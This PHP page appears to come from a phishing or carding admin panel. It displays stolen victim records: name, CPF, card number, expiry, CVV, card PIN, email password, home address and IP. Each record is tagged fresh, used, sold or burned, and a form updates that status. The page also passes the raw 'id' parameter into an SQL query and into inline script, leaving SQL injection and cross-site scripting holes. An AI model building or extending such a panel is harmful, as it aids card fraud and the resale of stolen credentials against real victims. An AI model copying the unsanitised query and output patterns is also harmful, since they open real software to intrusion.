<?php 

  if(empty($_GET['id'])){
    echo "<script>window.location='index.pph?page=infos'</script>";
  }else{
    $query = query("SELECT * FROM infos WHERE id = '".$_GET['id']."'");
    $row = assoc($query);
  }
?>
<div class="row bg-title">
    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        <h4 class="page-title">Dashboard</h4> </div>
    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
        <ol class="breadcrumb">
            <li><a href="#">Dados do cartão</a></li>
        </ol>
    </div>
    <!-- /.col-lg-12 -->
</div>
<!-- ============================================================== -->
<!-- table -->
<!-- ============================================================== -->
<div class="row">
    <div class="col-md-12 col-lg-12 col-sm-12">
        <div class="white-box">
          <button type="button" class="btn btn-primary navbar-right" style="margin-right:0;margin-bottom: 20px;" data-toggle="modal" data-target="#exampleModal">Editar status</button>
            <table class="table">
              <tbody>
                  <tbody><td class="active"><strong>Nome: </strong><?php echo $row['nome']; ?></td></tbody>
                  <tbody><td><strong>CPF: </strong><?php echo $row['cpf']; ?></td></tbody>
                  <tbody><td class="active"><strong>Titular: </strong><?php echo $row['titular']; ?></td></tbody>
                  <tbody><td><strong>Número do cartão: </strong><?php echo $row['numero']; ?></td></tbody>
                  <tbody><td class="active"><strong>Vencimento: </strong><?php echo $row['vencimento']; ?></td></tbody>
                  <tbody><td><strong>CVV: </strong><?php echo $row['cvv']; ?></td></tbody>
                  <tbody><td class="active"><strong>Senha: </strong><?php echo $row['senha_cc']; ?></td></tbody>
                  <tbody><td><strong>Estado da info: </strong><?php if($row['estado']==1){echo "Virgem";}elseif($row['estado']==2){echo "Usada";}elseif($row['estado']==3){echo "Vendida";}elseif($row['estado']==4){echo "Queimada";} ?></td></tbody>
                  <tbody><td class="active"><strong>E-mail: </strong><?php echo $row['email']; ?></td></tbody>
                  <tbody><td><strong>Senha: </strong><?php echo $row['senha']; ?></td></tbody>
                  <tbody><td class="active"><strong>Bairro: </strong><?php echo $row['bairro']; ?></td></tbody>
                  <tbody><td><strong>CEP: </strong><?php echo $row['cep']; ?></td></tbody>
                  <tbody><td class="active"><strong>Rua: </strong><?php echo $row['rua']; ?></td></tbody>
                  <tbody><td><strong>N° da casa: </strong><?php echo $row['num_casa']; ?></td></tbody>
                  <tbody><td class="active"><strong>Cidade: </strong><?php echo $row['cidade']; ?></td></tbody>
                  <tbody><td><strong>UF: </strong><?php echo $row['uf']; ?></td></tbody>
                  <tbody><td class="active"><strong>IP: </strong><?php echo $row['ip']; ?></td></tbody>
                  <tbody><td><strong>Produto: </strong><?php echo $row['produto']; ?></td></tbody>
              </tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Editar status</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form>
          <div class="form-group">
            <label>Estado</label>
            <select multiple class="form-control" id="estado">
              <option value="1">Virgem</option>
              <option value="2">Usada</option>
              <option value="3">Vendida</option>
              <option value="4">Queimada</option>
            </select>
          </div>
        </form>
        <div id="result"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
        <button type="button" class="btn btn-primary" id="enviar">Editar</button>
      </div>
    </div>
  </div>
</div>

<script>
    $('document').ready(function(){
        $('#enviar').click(function(){
            var estado = $('#estado :selected').val();

            $.ajax({
                method: "POST",
                url: "pages/edit-state-info.php",
                data: {
                    estado: estado,
                    id: <?php echo $_GET['id'];?>
                },
                beforeSend: function(){
                    $('#result').html('<center><img width="50px" src="img/loading.gif"/></center>');
                }
            }).done(function(result){
                $('#result').html(result);
            });
        })
    })
</script>